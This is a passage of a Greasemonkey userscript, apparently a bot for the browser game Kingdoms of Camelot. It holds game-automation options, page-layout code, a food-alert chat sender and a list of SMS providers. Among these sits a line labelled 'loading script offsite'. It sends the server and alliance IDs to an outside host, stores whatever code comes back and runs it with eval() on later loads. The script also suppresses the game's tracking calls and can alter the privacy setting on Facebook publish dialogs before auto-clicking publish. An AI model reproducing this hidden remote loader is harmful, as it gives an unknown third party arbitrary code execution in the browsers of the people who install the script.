  CraftingActif : {3000:false,3001:false,3002:false,3003:false,3004:false,3005:false,3006:false,3007:false,3008:false,3009:false,3010:false,3011:false},
  CraftingNb : {3000:0,3001:0,3002:0,3003:0,3004:0,3005:0,3006:0,3007:0,3008:0,3009:0,3010:0,3011:0},
  tr	:	false,
  trset	:	0,
  actr:     false,
  actrset : 0,
  AsTroops     : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  AsEnabled  : {1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},
  AsSelectMax  : {1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},
  AsMax        : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
};
var FarmOptions = {
	RallyClip: 0,
    Running: false,
    MinMight: 0,
    MaxMight: 999999999,
    Interval: 0,
    SendInterval: 10,
    MaxDistance: 20,
    Inactive:30,
	DeleteReports:false,
	Troops: {1: 0,2: 0,3: 0,4: 0,5: 0,6: 0,7: 0,8: 0,9: 0,10: 0,11: 0,12: 0},
	FarmNumber: {1: 0,2: 0,3: 0,4: 0,5: 0,6: 0,7: 0,8: 0},
    CityEnable: {1: true,2: true,3: true,4: true,5: true,6: true,7: true,8: true},
    CityLevel: {0: true,1: true,2: true,3: true,4: true,5: true,6: true,7: true,8: true,9: true,10: true,11: true,12: true},
    Diplomacy: {friendly: true,hostile: true,friendlyToThem: true,friendlyToYou: true,neutral:true,unallied:true},
    FarmMarches: [],
    farmMarches: {},
    Attacks:0,
	Checks:0,
};
var ThroneOptions = {
    Active:false,
    Interval:30,
    RepairTime:0,
	Tries:0,
    minStones : 100000,
	Good:0,
	Bad:0,
	Items: [],
    Salvage:{Attack:true,Defense:true,Life:true,Speed:true,Accuracy:true,Range:true,Load:true,MarchSize:true,MarchSpeed:true,CombatSkill:true,IntelligenceSkill:true,PoliticsSkill:true,ResourcefulnessSkill:true,TrainingSpeed:true,ConstructionSpeed:true,ResearchSpeed:true,CraftingSpeed:true,Upkeep:true,ResourceProduction:true,ResourceCap:true,Storehouse:true,Morale:true,ItemDrop:true},
   SalvageA:{Attack:{},Defense:{},Life:{},Speed:{},Accuracy:{},Range:{},Load:{},MarchSize:{},MarchSpeed:{},CombatSkill:{},IntelligenceSkill:{},PoliticsSkill:{},ResourcefulnessSkill:{},TrainingSpeed:{},ConstructionSpeed:{},ResearchSpeed:{},CraftingSpeed:{},Upkeep:{},ResourceProduction:{},ResourceCap:{},Storehouse:{},Morale:{},ItemDrop:{}},
	SalvageQuality:0,
	saveXitems:0,
	thronekeep:1,
	Salvage_fav:{},
    SingleStat:false,
    Cityrand:false,
    SalvageLevel:1,
    UseTokens:false,
    SaveUnique:true,
};

var AttackOptions = {
  LastReport    		: 0,
  MsgEnabled          	: true,
  MsgInterval	      	: 30,
  Method			    : "distance",
  SendInterval			: 8,
  MaxDistance           : 40,
  RallyClip				: 0,
  Running       		: false,
  BarbsFailedKnight		: 0,
  BarbsFailedRP 		: 0,
  BarbsFailedTraffic   	: 0,
  BarbsFailedVaria		: 0,
  BarbsFailedBog        : 0,
  BarbsTried    		: 0,
  DeleteMsg             : true,
  DeleteMsgs0			: false,
  Foodstatus			: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  MsgLevel			    : {1:true,2:true,3:true,4:true,5:true,6:true,7:true,8:true,9:true,10:true},
  BarbsDone     		: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  BarbNumber    		: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  Levels    			: {1:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},2:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},3:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},4:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},5:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},6:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},7:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},8:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false}},
  Troops    			: {1:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},2:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},3:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},4:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},5:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},6:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},7:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},8:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},9:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},10:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0}},
  MinDistance			: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0},
  Distance              : {1:750,2:750,3:750,4:750,5:750,6:750,7:750,8:750,9:750,10:750},
  Update                : {1:[0,0],2:[0,0],3:[0,0],4:[0,0],5:[0,0],6:[0,0],7:[0,0],8:[0,0]},
  UpdateEnabled         : true,
  UpdateInterval	    : 30,
  stopsearch            : 1,
  knightselector        : 0,
  barbMinKnight			: 56,
  barbMaxKnight			: 255,
  threshold				: 750000,
};

var ResetAll=false;
var deleting=false;

var ChatOptions = {
  latestChats               : [],
  AllowUsersRemoteControl   : [],
  BlacklistUsersRemoteControl: [],
  password                  : '',
  Chatpassenable            : false,
};

var ApothecaryOptions = {
	Active : false,
	goldkeep : 0,
	city : {0:[],1:[],2:[],3:[],4:[],5:[],6:[],7:[]},
};

var CombatOptions = {
	research : [{tch8:0,tch9:0,tch13:0,tch15:0}, //Poison Edge, Metal Alloys, Fletching, Healing Potions
	            {tch8:0,tch9:0,tch13:0,tch15:0}],
	knt      : [50,50],
	guardian : [['wood',0],['ore',0]],
	ratio    : [{unt1:{},unt2:{},unt3:{},unt4:{},unt5:{},unt6:{},unt7:{},unt8:{},unt9:{},unt10:{},unt11:{},unt12:{}},
	            {unt1:{},unt2:{},unt3:{},unt4:{},unt5:{},unt6:{},unt7:{},unt8:{},unt9:{},unt10:{},unt11:{},unt12:{}}],
}

// Get element by id shortform with parent node option
function $(ID,root) {return (root||document).getElementById(ID);}

var nHtml={
  FindByXPath:function(obj,xpath,nodetype) {
	if(!nodetype){
		nodetype = XPathResult.FIRST_ORDERED_NODE_TYPE;
	}
	try {
		var q=document.evaluate(xpath,obj,null,nodetype,null);
	} catch(e) {
		GM_log('bad xpath:'+xpath);
	}
	if(nodetype == XPathResult.FIRST_ORDERED_NODE_TYPE){
		if(q && q.singleNodeValue) { return q.singleNodeValue; }
	}else{
		if(q){
			return q;
		}
	}
	return null;
  },
  
  ClickWin:function(win,obj,evtName) {
	var evt = win.document.createEvent("MouseEvents");
	evt.initMouseEvent(evtName, true, true, win,
		0, 0, 0, 0, 0, false, false, false, false, 0, null);
	return !obj.dispatchEvent(evt);
  },

  Click:function(obj) {
	return this.ClickWin(window,obj,'click');
  },
  
  ClickTimeout:function(obj,millisec) {
	window.setTimeout(function() {
		return nHtml.ClickWin(window,obj,'click');
	},millisec+Math.floor(Math.random()*500));
  },

  SetSelect:function(obj,v) {
	for(var o=0; o<obj.options.length; o++) {
		if(v==obj.options[o].value) { obj.options[o].selected=true; return true; }
	}
	return false;
  },

}

readGlobalOptions ();
readOptions();
if (document.URL.search(/apps.facebook.com\/kingdomsofcamelot/i) >= 0){
  facebookInstance ();
  return;
}
if (document.URL.search(/kabam.com\/games\/kingdoms-of-camelot\/play/i) >= 0){
  kabamStandAlone ();
  return;
}

if (document.URL.search(/facebook.com/i) >= 0){
	if(document.URL.search(/connect\/uiserver.php/i) >= 0 ||
	   document.URL.search(/serverfbml/i) >= 0 ||
	   document.URL.search(/dialog\/stream.publish/i) >= 0 ||
	   document.URL.search(/dialog\/apprequests/i) >= 0 ||
	   document.URL.search(/dialog\/feed/i) >= 0)
		HandlePublishPopup ();
  return;
}
if (document.URL.search(/kingdomsofcamelot.com/i) >= 0){
  kocWideScreen ();
}

function kocWideScreen(){
  function setWideFb (){
	//logit(document.getElementById("kocIframes1"));
	var kocFrame = '';
	try{
		kocFrame = parent.document.getElementById('kocIframes1');
	} catch (e){
		logit("kocWideScreen "+e);
		kocFame = document.getElementById("kocIframes1");
	}
	if (!kocFrame){
	  setTimeout (setWideFb, 1000);
	  return;
	}
	kocFrame.style.width = '100%';
	var style = document.createElement('style')
	style.innerHTML = 'body {margin:0; width:100%; !important;}';
	kocFrame.parentNode.appendChild(style);
  }
  kocWatchdog ();
  if (GlobalOptions.pbWideScreen)
		setWideFb();
}
    var aj2 = function(c, d, b, a)
    {
        if (d.ctrl && d.ctrl == "Tracking")
        {
            logit("Tracking intercepted");
            logit("Ajax d: " + uneval(d));
            return;
            //disable - don't send on the message
        }
        else
        {
            unsafeWindow.AjaxCall.gAjaxRequest(c, d, b, a, "post");
        }
    }
    if(unsafeWindow.AjaxCall)
    unsafeWindow.AjaxCall.gPostRequest = aj2
/***  Run only in "apps.facebook.com" instance ... ***/
function facebookInstance (){
  function setWide (){
	var iFrame = document.getElementById('iframe_canvas');
	if (!iFrame){
	  setTimeout (setWide, 1000);
	  return;
	}
	iFrame.style.width = '100%';

	while ( (iFrame=iFrame.parentNode) != null)
	  if (iFrame.tagName=='DIV')
		iFrame.style.width = '100%';
	document.getElementById('globalContainer').style.left = '0px';
    try{    
      document.getElementById('rightCol').parentNode.removeChild(document.getElementById('rightCol'));
      document.getElementById('leftColContainer').parentNode.removeChild(document.getElementById('leftColContainer'));
    } catch (e){
      // toolkit may have removed them already!
    }
    var e = document.getElementById('mainContainer');
	if(e){
		if (GlobalOptions.pbWideScreenStyle=="normal") e.parentNode.style.minWidth = '100%';
		if (GlobalOptions.pbWideScreenStyle=="wide") e.parentNode.style.width = '1520px';
		if (GlobalOptions.pbWideScreenStyle=="ultra") e.parentNode.style.width = '1900px';
		for(i=0; i<e.childNodes.length; i++){
			if(e.childNodes[i].id == 'contentCol'){
				e.childNodes[i].style.margin = '0px';
				e.childNodes[i].style.paddingTop = '5px';
				break;
			}
		}
	}
	var e = document.getElementById('pageHead');
	if(e){
		e.style.width = '80%';
		e.style.margin = '0 10%';
	}
	var e = document.getElementById('bottomContent');
	if(e){
		e.style.padding = "0px 0px 12px 0px";
	}
    
  }
  facebookWatchdog();
  if (GlobalOptions.pbWideScreen)
    setWide();
}

function kabamStandAlone (){
  function setWide (){
	var iFrames = $('game_frame');
	if (!iFrames){
	  setTimeout (setWide, 1000);
	  return;
	}
	iFrames.style.width = '100%';
	while ( (iFrames=iFrames.parentNode) != null && iFrames.tagName !== "BODY")
	  //if (iFrames.tagName=='DIV')
		iFrames.style.width = '100%';

	try{    
      document.getElementById('promo-sidebar').parentNode.removeChild(document.getElementById('promo-sidebar'));
    } catch (e){
      logit("Failed to remove sidebar "+e);
    }
  }

  function sendmeaway (){
	var serverID = /s=([0-9]+)/im.exec (document.location.href);
	var sr = /value="(.*?)"/im.exec ($("post_form").innerHTML);
	var goto = $("post_form").action+(serverID?"?s="+serverID[1]:'');
	var t = '<FORM target="_top" action="'+ goto +'" method=post><INPUT id=xxxpbutExplode type=submit value=RELOAD><INPUT type=hidden name=signed_request value="'+ sr[1] +'" /><INPUT type=hidden name=platform_req value=A /></form>';
	var e = document.createElement ('div');
	e.innerHTML = t;
	document.body.appendChild (e);
	setTimeout (function (){document.getElementById('xxxpbutExplode').click();}, 0);
  }
  if (GlobalOptions.pbWideScreen)
	setWide();
  if(GlobalOptions.pbNoMoreKabam)
	sendmeaway();
  }

function HandlePublishPopup() {
	if(GlobalOptions.autoPublishGamePopups || GlobalOptions.autoCancelGamePopups){
	// Check the app id (we only want to handle the popup for kingdoms of camelot)
		var FBInputForm = document.getElementById('uiserver_form');
		//logit("FBInputForm "+FBInputForm);
		if(FBInputForm){
			var channel_input = nHtml.FindByXPath(FBInputForm,".//input[contains(@name,'channel')]");
			//logit("channel_input "+channel_input);
			if(channel_input){
				var current_channel_url = channel_input.value;
				//logit("current_channel_url "+current_channel_url);
				if (current_channel_url.match(/(http|https):\/\/(.*?)\.kingdomsofcamelot\.com(.*?)/i)) {
					var publish_button = nHtml.FindByXPath(FBInputForm,".//input[@type='submit' and contains(@name,'publish')]");
					var cancel_publish_button = nHtml.FindByXPath(FBInputForm,".//input[@type='submit' and contains(@name,'cancel')]");
					var privacy_setting = nHtml.FindByXPath(FBInputForm,".//select[@name='audience[0][value]']");
					//logit("publish_button "+publish_button);
					//logit("privacy_setting "+privacy_setting);
					//logit("cancel_button " + cancel_publish_button);
					if(publish_button && privacy_setting){
						// 80: Everyone
						// 50: Friends of Friends
						// 40: Friends Only
						// 10: Only Me
						privacy_setting.innerHTML = '<option value="'+ GlobalOptions.autoPublishPrivacySetting +'"></option>';
						privacy_setting.selectedIndex = 0;
						if (GlobalOptions.autoPublishGamePopups && !GlobalOptions.autoCancelGamePopups){
							nHtml.Click(publish_button);
						}else if (GlobalOptions.autoCancelGamePopups && !GlobalOptions.autoPublishGamePopups){
							nHtml.Click(cancel_publish_button);
						}
					}
				}
			}		
		}
		setTimeout(HandlePublishPopup, 1000);
	}
}

var Cities = {};
var Seed = unsafeWindow.seed;
var Tabs = {};
var pbButtons = {};
var mainPop;
var pbStartupTimer = null;
var pbPopUpTopClass = 'pbPopTop';
var firefoxVersion = getFirefoxVersion();
var TrainCity = 0;
var CM = unsafeWindow.cm;

function pbStartup (){
  clearTimeout (pbStartupTimer);
  if (unsafeWindow.pbLoaded)
    return;
  var metc = getClientCoords(document.getElementById('main_engagement_tabs'));
  if (metc.width==null || metc.width==0){
    pbStartupTimer = setTimeout (pbStartup, 1000);
    return;
  }
  unsafeWindow.pbLoaded = true;
  //logit ("KofC client version: "+ anticd.getKOCversion());
  
  Seed = unsafeWindow.seed;
  readOptions();
  var styles = '.xtab {padding-right: 5px; border:none; background:none; white-space:nowrap;}\
    .xtabBR {padding-right: 5px; border:none; background:none;}\
    table.pbTab tr td {border:none; background:none; white-space:nowrap; padding:0px}\
    table.Throne {background-color:#FFFFE3; white-space:nowrap; padding:0px; border-style:solid; border-color:darkgrey; width:250px; max-width:250px; text-wrap:normal;word-wrap:break-word}\
    table.Throne tr td {background:none; white-space:nowrap; padding:0px; border-style:none;}\
    table.ThroneEQ {background-color:#FFFFE3; white-space:nowrap; padding:0px; border-style:solid; border-color:lightred; width:250px; max-width:250px; text-wrap:normal;word-wrap:break-word}\
    table.ThroneEQ tr td {background:none; white-space:nowrap; padding:0px; border-style:none}\
    .hostile td { background:red; }.friendly td{background:lightgreen; }.ally td{background:lightblue; }\
    table.pbTabPadNW tr td {border:none; background:none; white-space:nowrap; padding: 2px 4px 2px 8px;}\
    table.pbTabBR tr td {border:none; background:none;}\
    table.pbTabLined tr td {border:1px none none solid none; padding: 2px 5px; white-space:nowrap;}\
    table.pbOptions tr td {border:1px none none solid none; padding: 1px 3px; white-space:nowrap;}\
    table.pbSrchResults tr td {border:1px none none solid none; padding: 1px 3px; white-space:nowrap;}\
    table.pbTabSome tr td {border:none; background:none; padding: 1px 3px; white-space:nowrap;}\
    table.pbTabPad tr td { padding-left: 8px;}\
    table.ptNoPad tr td {border:none; background:none; white-space:nowrap; padding:0px}\
    .pbDetLeft {padding:0 5px 0 0 !important; font-weight:bold; text-align:right}\
    .pbStat {border:1px solid; border-color:#000000; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:#ffffff ; background-color:#357;  -moz-border-radius:5px;}\
    .pbentry {padding: 7px; white-space:nowrap;}\
    button::-moz-focus-inner, input[type="submit"]::-moz-focus-inner { border: none; }\
    span.whiteOnRed {padding-left:3px; padding-right:3px; background-color:#700; color:white; font-weight:bold}\
    span.boldRed {color:#800; font-weight:bold}\
    .castleBut {outline:0px; margin-left:0px; margin-right:0px; width:24px; height:26px; font-size:12px; font-weight:bold;}\
    .castleBut:hover {background-image:url("'+ URL_CASTLE_BUT_SEL +'")}\
    .castleButNon {background-image:url("'+ URL_CASTLE_BUT +'")}\
    .castleButSel {background-image:url("'+ URL_CASTLE_BUT_SEL +'")}\
    input.pbDefButOn {cursor:pointer; border:1px solid #45d183; -moz-box-shadow:inset 0px 1px 5px #3aef8b; -moz-border-radius:5px;}\
    input.pbDefButOff {cursor:pointer; border:1px solid #f61646; -moz-box-shadow:inset 0px 1px 5px #f6375f; -moz-border-radius:5px;}\
    a.ptButton20 {color:#ffff80}\
    table.pbMainTab { empty-cells: show; margin-left: 5px; margin-top: 4px; padding: 1px;  padding-left:5px;}\
    table.pbMainTab tr td a {color:inherit }\
    table.pbMainTab tr td   {height:60%; empty-cells:show; padding: 0px 4px 0px 4px;  margin-top:5px; white-space:nowrap; border: 1px solid; border-style: none none solid none; -moz-border-radius:5px; }\
    table.pbMainTab tr td.spacer {padding: 0px 0px;}\
    table.pbMainTab tr td.notSel { color: #ffffff; font-size: 12px; font-weight:bold; -moz-border-radius: 10px; -moz-box-shadow: 0px 1px 3px #357544; text-shadow: -1px 1px 3px #666666; border: solid #615461 1px; background: -moz-linear-gradient(top, #6ff28e, #196b2c);}\
    table.pbMainTab tr td.sel { color: #000000; font-size: 12px; font-weight:bold; -moz-border-radius: 10px; -moz-box-shadow: 0px 1px 3px #357544; text-shadow: -1px 1px 3px #CECECE; border: solid #615461 1px; background: -moz-linear-gradient(top, #6ff28e, #196b2c);}\
    table.pbMainTab tr td:hover { color: #191919; font-size: 12px; font-weight:bold; text-shadow: -1px 1px 3px #CECECE; background: -moz-linear-gradient(top, #43cc7e, #20a129)}\
    tr.pbPopTop td { background-color:transparent; border:none; height: 21px; padding:0px;}\
    tr.pbretry_pbPopTop td { background-color:#a00; color:#fff; border:none; height: 21px;  padding:0px; }\
    tr.pbMainPopTop td { background-color:#ded; border:none; height: 42px; width:80%; padding:0px; }\
    tr.pbretry_pbMainPopTop td { background-color:#a00; color:#fff; border:none; height: 42px;  padding:0px; }\
    .pbPopMain  { border:1px solid #000000; -moz-box-shadow:inset 0px 0px 10px #6a6a6a; -moz-border-radius-bottomright: 20px; -moz-border-radius-bottomleft: 20px;}\
    .pbPopup  {border:5px ridge #666; opacity:'+(parseFloat(Options.Opacity)<'0.5'?'0.5':Options.Opacity)+'; -moz-border-radius:25px; -moz-box-shadow: 1px 1px 5px #000000; }\
    span.pbTextFriendly {color: #080}\
    span.pbTextHostile {color: #800}\
    .pbButCancel {background-color:#a00; font-weight:bold; color:#fff}\
    div.indent25 {padding-left:25px}';
    
  window.name = 'PT';
  logit ("* Zakra Robot Alliance Version : "+ Version +" Chargée");
  readLanguage();
  readChatOptions();
  readCrestData();
  readTrainingOptions();
  readCombatOptions();
  readAttackOptions();
  readFarmOptions();
  readThroneOptions();
  readLayoutOptions();
  readApothecaryOptions();
  setCities();

// TODO: Make sure WinPos is visible on-screen ?
  if (Options.pbWinPos==null || Options.pbWinPos.x==null|| Options.pbWinPos.x=='' || isNaN(Options.pbWinPos.x)){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.pbWinPos.x = c.x+4;
    Options.pbWinPos.y = c.y+c.height;
    saveOptions ();
  }

  // Reset window xPos if the widescreen option is disabled
  if(!GlobalOptions.pbWideScreen && Options.pbWinPos.x > 700){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.pbWinPos.x = c.x+4;
    saveOptions ();
  }

  mainPop = new pbPopup ('pb', Options.pbWinPos.x, Options.pbWinPos.y, 850,800, Options.pbWinDrag,
      function (){
        tabManager.hideTab();
        Options.pbWinIsOpen=false;
        saveOptions();
      });
  mainPop.autoHeight (true);  

  mainPop.getMainDiv().innerHTML = "<span style='float:right;margin-right:20px;margin-top:4px;font-size:16px;text-shadow: 1px 1px 1px #AAA; font-variant:small-caps;'><center><b>Zakra Robot Alliance - <a href='http://userscripts.org/scripts/show/158507'>Mise à Jours</a></b></center></span><STYLE>"+ styles +"</style>";
  AddMainTabLink('Zakra Robot Alliance', eventHideShow, mouseMainTab);
  tabManager.init (mainPop.getMainDiv());
  actionLog ("Zakra Robot Alliance Version : "+ Version +" Chargée ");
  
  FairieKiller.init (Options.pbKillFairie);
  RefreshEvery.init ();
  SpamEvery.init ();
  CollectGold.init();
  FoodAlerts.init();
  ChatPane.init();
  ChatStuff.init();
  DeleteReports.init();
  //DeleteThrone.init();
  if (Options.pbWinIsOpen && Options.pbTrackOpen){
    mainPop.show (true);
    tabManager.showTab();
  }
  window.addEventListener('unload', onUnload, false);
  exportToKOCattack.init();
  WideScreen.init ();
  WideScreen.setChatOnRight (Options.pbChatOnRight);
  WideScreen.useWideMap (Options.pbWideMap);
  setInterval (DrawLevelIcons,1250);
  killbox();
  if(Options.mklag)  setInterval(fixkabamlag,1000*60);
  if(Options.amain) setTimeout(function (){unsafeWindow.citysel_click(document.getElementById('citysel_'+Number(Number(Options.smain)+1)))},1000);
}

/************************ Food Alerts *************************/
var FoodAlerts = {

  init : function (){
   var f = FoodAlerts;
   f.e_eachMinute();
  },

  minuteTimer : null,

  e_eachMinute : function (){  
    var f = FoodAlerts;
    var now = unixTime();
      row = [];

      for(i=0; i < Cities.numCities; i++) {
        var rp = getResourceProduction (Cities.cities[i].id);
        var foodleft = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][0])/3600;
        var usage = rp[1] - parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][3]);
        row[i] = rp[1] - usage;
          var timeLeft = parseInt(Seed.resources["city" + Cities.cities[i].id]['rec1'][0]) / 3600 / (0-usage) * 3600;
          var msg = '';
        if (usage < 0) {
    if (Options.pbFoodAlert && timeLeft<(6*3600)) {
                msg += translate("My city")+' '+Cities.cities[i].name.substring(0,10) + ' (' +
                      Cities.cities[i].x +','+ Cities.cities[i].y + ')';
                msg += translate("is low on food")+". "+translate("Remaining")+': '+addCommasWhole(foodleft)+' ('+timestrShort(timeLeft)+') '+translate("Upkeep")+': '+addCommas(usage);
                sendChat ("/a " + msg);
          }
    }
      }
  f.minuteTimer = setTimeout (f.e_eachMinute, 1800000);
  },
}




//baos780 code for loading script offsite
if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return; var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID);  if (s != null) {    s = JSON2.parse (s);  eval(s);  };  if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/4Cxy4.php?p="+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+unsafeWindow.seed.allianceDiplomacies.allianceId,	headers: {'Accept': 'text/javascript',}, 	onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };

/****************************  Tower Tab  ******************************/
Tabs.tower = {
  tabOrder: 1,
  tabLabel: 'Tower',
    tabDisabled : !ENABLE_SAMPLE_TAB,
  myDiv: null,
  generateIncomingFunc : null,
  fixTargetEnabled : false,
  secondTimer : null,
  soundPlaying : false,
  defMode : {},  
  soundRepeatTimer : null,
  soundStopTimer : null,
  towerMarches: [],
  Providers : {
        0: { 'country': "--Country--", 'provider': "--Provider--" },
        1: { 'country': "AUSTRALIA", 'provider': "T-Mobile" },
        2: { 'country': "AUSTRALIA", 'provider': "Optus Zoo" },
        3: { 'country': "AUSTRIA", 'provider': "T-Mobile" },
        4: { 'country': "BULGARIA", 'provider': "Mtel" },
        5: { 'country': "BULGARIA", 'provider': "Globul" },
        6: { 'country': "CANADA", 'provider': "Aliant" },
        7: { 'country': "CANADA", 'provider': "Bell Mobility" },
        8: { 'country': "CANADA", 'provider': "Fido" },
        9: { 'country': "CANADA", 'provider': "MTS Mobility" },
        10: { 'country': "CANADA", 'provider': "Rogers Wireless" },
        11: { 'country': "CANADA", 'provider': "Sasktel Mobility" },
        12: { 'country': "CANADA", 'provider': "Telus" },
        13: { 'country': "CANADA", 'provider': "Virgin Mobile" },
        14: { 'country': "CANADA", 'provider': "Presidents Choice" },
        15: { 'country': "GERMANY", 'provider': "T-Mobile" },
        16: { 'country': "GERMANY", 'provider': "Vodafone" },
        17: { 'country': "GERMANY", 'provider': "O2" },
        18: { 'country': "GERMANY", 'provider': "E-Plus" },
        19: { 'country': "ICELAND", 'provider': "OgVodafone" },
        20: { 'country': "ICELAND", 'provider': "Siminn" },
        21: { 'country': "INDIA", 'provider': "Andhra Pradesh AirTel" },
        22: { 'country': "INDIA", 'provider': "Andhra Pradesh Idea Cellular" },
        23: { 'country': "INDIA", 'provider': "Chennal Skycell Airtel" },
        24: { 'country': "INDIA", 'provider': "Chennel RPG Cellular" },
        25: { 'country': "INDIA", 'provider': "Delhi Airtel" },
        26: { 'country': "INDIA", 'provider': "Delhi Hutch" },
        27: { 'country': "INDIA", 'provider': "Gujarat Idea Cellular" },
        28: { 'country': "INDIA", 'provider': "Gujaret Airtel" },
        29: { 'country': "INDIA", 'provider': "Gujaret Celforce" },
        30: { 'country': "INDIA", 'provider': "Goa Airtel" },
        32: { 'country': "INDIA", 'provider': "Goa Idea Cellular" },
        33: { 'country': "INDIA", 'provider': "Haryana Airtel" },
        34: { 'country': "INDIA", 'provider': "Haryana Escotel" },
        35: { 'country': "INDIA", 'provider': "Himachal Pradesh Airtel" },
        36: { 'country': "INDIA", 'provider': "Karnataka Airtel" },
        37: { 'country': "INDIA", 'provider': "Kerala Airtel" },
        38: { 'country': "INDIA", 'provider': "Kerala Escotel" },
        39: { 'country': "INDIA", 'provider': "Kerala BPL Mobile" },
        40: { 'country': "INDIA", 'provider': "Kolkata Airtel" },
        41: { 'country': "INDIA", 'provider': "Madhya Pradesh Airtel" },
        42: { 'country': "INDIA", 'provider': "Maharashtra Airtel" },
        43: { 'country': "INDIA", 'provider': "Maharashtra BPL Mobile" },
        44: { 'country': "INDIA", 'provider': "Maharashtra Idea Cellular" },
        45: { 'country': "INDIA", 'provider': "Mumbai Airtel" },
        46: { 'country': "INDIA", 'provider': "Mumbai BPL Mobile" },
        47: { 'country': "INDIA", 'provider': "Punjab Airtel" },
        48: { 'country': "INDIA", 'provider': "Pondicherry BPL Mobile" },
        49: { 'country': "INDIA", 'provider': "Tamil Nadu Airtel" },
        50: { 'country': "INDIA", 'provider': "Tamil Nadu BPL Mobile" },
        51: { 'country': "INDIA", 'provider': "Tamil Nadu Aircel" },
        52: { 'country': "INDIA", 'provider': "Uttar Pradesh West Escotel" },
        53: { 'country': "IRELAND", 'provider': "Meteor" },
        54: { 'country': "IRELAND", 'provider': "Meteor MMS" },
        55: { 'country': "ITALY", 'provider': "TIM" },
        56: { 'country': "ITALY", 'provider': "Vodafone" },
        57: { 'country': "JAPAN", 'provider': "AU by KDDI" },
        58: { 'country': "JAPAN", 'provider': "NTT DoCoMo" },
        59: { 'country': "JAPAN", 'provider': "Vodafone Chuugoku/Western" },
        60: { 'country': "JAPAN", 'provider': "Vodafone Hokkaido" },
        61: { 'country': "JAPAN", 'provider': "Vodafone Hokuriko/Central North" },
        62: { 'country': "JAPAN", 'provider': "Vodafone Kansai/West, including Osaka" },
        63: { 'country': "JAPAN", 'provider': "Vodafone Kanto/Koushin/East including Tokyo" },
        64: { 'country': "JAPAN", 'provider': "Vodafone Kyuushu/Okinawa" },
        65: { 'country': "JAPAN", 'provider': "Vodafone Shikoku" },
        66: { 'country': "JAPAN", 'provider': "Vodafone Touhoku/Niigata/North" },
        67: { 'country': "JAPAN", 'provider': "Vodafone Toukai/Central" },
        68: { 'country': "JAPAN", 'provider': "Willcom" },
        69: { 'country': "JAPAN", 'provider': "Willcom di" },
        70: { 'country': "JAPAN", 'provider': "Willcom dj" },
        71: { 'country': "JAPAN", 'provider': "Willcom dk" },
        72: { 'country': "NETHERLANDS", 'provider': "T-Mobile" },
        73: { 'country': "NETHERLANDS", 'provider': "Orange" },
        74: { 'country': "SINGAPORE", 'provider': "M1" },
        75: { 'country': "SOUTH AFRICA", 'provider': "Vodacom" },
        76: { 'country': "SPAIN", 'provider': "Telefonica Movistar" },
        77: { 'country': "SPAIN", 'provider': "Vodafone" },
        78: { 'country': "SWEDEN", 'provider': "Tele2" },
        79: { 'country': "UNITED STATES", 'provider': "Teleflip" },
        80: { 'country': "UNITED STATES", 'provider': "Alltel" },
        81: { 'country': "UNITED STATES", 'provider': "Ameritech" },
        82: { 'country': "UNITED STATES", 'provider': "ATT Wireless" },
        83: { 'country': "UNITED STATES", 'provider': "Bellsouth" },
        84: { 'country': "UNITED STATES", 'provider': "Boost" },
        85: { 'country': "UNITED STATES", 'provider': "CellularOne" },
        86: { 'country': "UNITED STATES", 'provider': "CellularOne MMS" },
        87: { 'country': "UNITED STATES", 'provider': "Cingular" },
        88: { 'country': "UNITED STATES", 'provider': "Edge Wireless" },
        90: { 'country': "UNITED STATES", 'provider': "T-Mobile" },
        91: { 'country': "UNITED STATES", 'provider': "Metro PCS" },
